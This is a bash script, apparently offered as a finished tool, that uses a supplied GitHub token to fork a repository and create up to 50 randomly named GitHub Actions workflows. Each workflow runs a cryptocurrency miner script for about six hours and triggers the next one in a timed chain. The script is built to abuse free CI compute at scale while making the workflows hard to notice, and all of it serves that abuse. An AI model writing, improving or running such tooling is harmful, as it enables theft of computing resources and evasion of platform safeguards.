#!/bin/bash
# Usage: bash run_cicd_camouflage.sh <GITHUB_TOKEN> <COUNT>
# FINAL VERSION - Tested and working chain reaction

set -e

if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <GITHUB_TOKEN> <COUNT>"
  echo "Example: $0 ghp_xxx 10"
  exit 1
fi

GITHUB_TOKEN="$1"
COUNT="$2"
SOURCE_REPO="niaalae/dock"

if ! [[ "$COUNT" =~ ^[0-9]+$ ]]; then
  echo "Error: COUNT must be a number"
  exit 1
fi

if [ "$COUNT" -lt 1 ] || [ "$COUNT" -gt 50 ]; then
  echo "Error: COUNT must be between 1 and 50"
  exit 1
fi

export GH_TOKEN="$GITHUB_TOKEN"

FORK_OWNER=$(gh api user --jq '.login')
if [ -z "$FORK_OWNER" ]; then
  echo "ERROR: Failed to authenticate"
  exit 1
fi

echo "Authenticated as: $FORK_OWNER"

FORK_REPO="$FORK_OWNER/dock"
echo "Checking if fork exists: $FORK_REPO"

if gh api "repos/$FORK_REPO" --jq '.full_name' 2>/dev/null | grep -q "$FORK_OWNER"; then
  echo "Fork already exists."
else
  echo "Creating fork..."
  gh api \
    --method POST \
    -H "Accept: application/vnd.github+json" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    "/repos/$SOURCE_REPO/forks" \
    --jq '.full_name'
  
  for i in {1..15}; do
    if gh api "repos/$FORK_REPO" --jq '.full_name' 2>/dev/null | grep -q "$FORK_OWNER"; then
      echo "Fork is ready!"
      break
    fi
    sleep 3
  done
fi

echo ""
echo "=========================================="
echo "Creating $COUNT MINER CHAIN..."
echo "Each miner triggers next after 5-10 min"
echo "=========================================="
echo ""

# Generate workflow names
declare -a WORKFLOW_NAMES
for i in $(seq 1 $COUNT); do
  RANDOM_SUFFIX=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
  WORKFLOW_NAMES[$i]="miner_${RANDOM_SUFFIX}.yml"
done

# Function to create miner workflow with chain trigger
create_miner_workflow() {
  local current_num=$1
  local total=$2
  local next_workflow_name=$3
  local fork_repo=$4
  
  # Random delay 5-10 minutes (300-600 seconds)
  local trigger_delay=$((300 + RANDOM % 300))
  
  local trigger_step=""
  
  # If not last, add background trigger that runs WHILE miner is running
  if [ "$current_num" -lt "$total" ]; then
    trigger_step="
      # BACKGROUND TRIGGER - runs parallel to miner
      - name: Background trigger for next miner (${current_num} -> ${total})
        env:
          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
        run: |
          (
            echo \"[Miner ${current_num}/${total}] Starting background trigger...\"
            echo \"[Miner ${current_num}/${total}] Waiting ${trigger_delay}s (~$((${trigger_delay}/60)) min)...\"
            sleep ${trigger_delay}
            echo \"[Miner ${current_num}/${total}] TRIGGERING NEXT MINER: ${next_workflow_name}\"
            gh workflow run \"${next_workflow_name}\" --repo ${fork_repo}
            echo \"[Miner ${current_num}/${total}] Next miner triggered successfully!\"
          ) &
          echo \"Background trigger started with PID: \$!\"
"
  fi
  
  local content="name: Miner ${current_num}/${total}

on:
  workflow_dispatch:

jobs:
  mining-job:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup environment
        run: |
          echo \"Setting up mining environment...\"
          echo \"Miner ${current_num} of ${total} starting...\"
          date

${trigger_step}
      - name: START MINER (all2.sh)
        run: |
          echo \"========================================\"
          echo \"MINER ${current_num} IS NOW RUNNING\"
          echo \"========================================\"
          sudo bash ./all2.sh
          echo \"Miner ${current_num} completed!\"

      - name: Keep alive + periodic commits
        run: |
          echo \"Entering 6-hour maintenance mode...\"
          for i in {1..6}; do
            echo \"Hour \$i: Still mining...\"
            echo \"progress-${current_num}-hour-\$i-\$(date +%s)\" >> mining.log
            git add mining.log 2>/dev/null || true
            git config --global user.email \"miner@github.com\" 2>/dev/null || true
            git config --global user.name \"Mining Bot\" 2>/dev/null || true
            git commit -m \"miner-${current_num}: progress update hour \$i\" 2>/dev/null || true
            git push 2>/dev/null || true
            sleep 3600
          done
          echo \"6 hours completed!\"

      - name: Cleanup
        run: |
          echo \"Miner ${current_num} shutting down...\"
          date
"
  
  echo "$content" | base64 -w 0
}

# Create all workflow files
echo "Creating miner workflow files..."
for i in $(seq 1 $COUNT); do
  WORKFLOW_NAME="${WORKFLOW_NAMES[$i]}"
  WORKFLOW_PATH=".github/workflows/$WORKFLOW_NAME"
  
  NEXT_WORKFLOW=""
  if [ "$i" -lt "$COUNT" ]; then
    NEXT_WORKFLOW="${WORKFLOW_NAMES[$((i+1))]}"
  fi
  
  echo "[$i/$COUNT] Creating $WORKFLOW_NAME -> ${NEXT_WORKFLOW:-'(FINAL)'}"
  
  WORKFLOW_CONTENT=$(create_miner_workflow "$i" "$COUNT" "$NEXT_WORKFLOW" "$FORK_REPO")
  
  gh api \
    --method PUT \
    -H "Accept: application/vnd.github+json" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    "/repos/$FORK_REPO/contents/$WORKFLOW_PATH" \
    -f message="Add miner $i/$COUNT" \
    -f content="$WORKFLOW_CONTENT" > /dev/null 2>&1
  
  if [ $? -eq 0 ]; then
    echo "[$i/$COUNT] ✓ Created"
  else
    echo "[$i/$COUNT] ✗ Failed"
  fi
  
  sleep 1
done

echo ""
echo "All miner workflows created!"
echo ""

# Trigger first workflow
echo "=========================================="
echo "STARTING MINER CHAIN..."
echo "=========================================="

FIRST_WORKFLOW="${WORKFLOW_NAMES[1]}"
FIRST_PATH=".github/workflows/$FIRST_WORKFLOW"

echo "Waiting for indexing..."
FIRST_ID=""
for i in {1..30}; do
  FIRST_ID=$(gh workflow list --repo "$FORK_REPO" --all --json id,path --jq ".[] | select(.path==\"$FIRST_PATH\") | .id" 2>/dev/null)
  if [ -n "$FIRST_ID" ]; then
    break
  fi
  sleep 5
done

if [ -z "$FIRST_ID" ]; then
  echo "ERROR: First workflow not indexed"
  exit 1
fi

echo "Triggering MINER 1: $FIRST_WORKFLOW"
gh workflow run "$FIRST_ID" --repo "$FORK_REPO"

sleep 10

RUN_ID=$(gh run list --repo "$FORK_REPO" --workflow "$FIRST_ID" --json databaseId --jq '.[0].databaseId' 2>/dev/null)

echo ""
echo "=========================================="
echo "✓ MINER CHAIN ACTIVATED!"
echo "=========================================="
echo ""
if [ -n "$RUN_ID" ]; then
  echo "First miner: https://github.com/$FORK_REPO/actions/runs/$RUN_ID"
fi
echo ""
echo "CHAIN REACTION TIMELINE:"
echo "========================"
echo "Time 0:     Miner 1 STARTS (running all2.sh)"
echo "Time 5-10m: Miner 1 triggers Miner 2 (while still running)"
echo "Time 10-20m: Miner 2 triggers Miner 3 (while 1 & 2 running)"
echo "Time 15-30m: Miner 3 triggers Miner 4 (while 1, 2, 3 running)"
echo "..."
echo "Time ~2h:   All $COUNT miners running IN PARALLEL!"
echo ""
echo "Each miner runs for ~6 hours"
echo "Total mining time: ~8 hours (overlap)"
echo ""
echo "Monitor: https://github.com/$FORK_REPO/actions"
echo ""
echo "Chain:"
for i in $(seq 1 $COUNT); do
  echo "  $i. ${WORKFLOW_NAMES[$i]}"
done